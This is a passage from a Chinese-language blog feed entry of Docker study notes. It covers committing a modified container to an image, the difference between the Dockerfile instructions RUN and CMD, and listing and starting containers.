ps</span><br></pre></td></tr></table></figure><p>进行修改，然后exit退出</p><p>提交修改</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker commit -m=<span class="string">&quot;描述信息&quot;</span> -a=<span class="string">&quot;作者&quot;</span> 容器ID myubuntu:20.04(要保存的镜像名)</span><br></pre></td></tr></table></figure><h1 id="构建镜像"><a href="#构建镜像" class="headerlink" title="构建镜像"></a>构建镜像</h1><p><strong>RUN</strong></p><p>RUN用于构建正在创建的映像。对于每个RUN命令，Docker将运行该命令，然后创建图像的新层。通过这种方式，您可以轻松地将映像回滚到以前的状态。RUN指令的语法是将shell命令的全文放在RUN之后(例如，RUN mkdir &#x2F;user&#x2F;local&#x2F;foo)。这将在&#x2F;bin&#x2F;sh shell中自动运行。</p><p><strong>CMD</strong></p><p>定义在启动时将在映像上运行的命令。与RUN不同，它不会为Image创建新层，而只是运行命令。每个Dockerfile&#x2F;Image只能有一个CMD。如果您需要运行多个命令，最好的方法是让CMD运行一个脚本。CMD要求您告诉它在哪里运行命令，这与run不同。所以示例CMD命令是:</p><p>CMD [“python”, “.&#x2F;app.py”]CMD [“&#x2F;bin&#x2F;bash”, “echo”, “Hello World”]</p><h1 id="容器管理"><a href="#容器管理" class="headerlink" title="容器管理"></a>容器管理</h1><ol><li>查看容器</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo docker ps    (列出正在运行的)</span><br><span class="line">sudo docker ps -a (列出所有)</span><br></pre></td></tr></table></figure><ol start="2"><li>启动容器</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker start containerid</span><br></pre></td></tr></table></figure><p>(容器和镜像是两个不同的概念，注意区分。)</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Docker学习&quot;&gt;&lt;a href=&quot;#Docker学习&quot; class=&quot;headerlink&quot; title=&quot;Docker学习&quot;&gt;&lt;/a&gt;Docker学习&lt;/h1&gt;&lt;h1 id=&quot;安装&quot;&gt;&lt;a href=&quot;#安装&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="Docker" scheme="https://h4ckf0rfun.github.io/categories/Docker/"/>
    
    
  </entry>
  
</feed>
